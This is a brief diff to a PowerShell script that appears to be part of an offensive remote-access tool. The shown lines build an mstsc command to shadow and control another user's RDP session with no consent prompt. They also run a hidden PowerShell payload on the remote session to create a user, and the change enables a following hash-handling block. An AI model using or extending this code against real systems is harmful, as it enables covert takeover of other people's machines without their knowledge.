@@ -488,7 +488,7 @@ function Remove-Exclusions {
 
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 if ($nogui){ Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host "mstsc /v computername /admin /shadow:$shadow /control /noconsentprompt /prompt /f"
-if ($createuser -like '-createuser') { invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
+if ($createuser -like '-createuser') { $hash ="true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
 else { Write-Host $txt38 -ForegroundColor Red ; sleep -milliseconds 4000 }
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock {
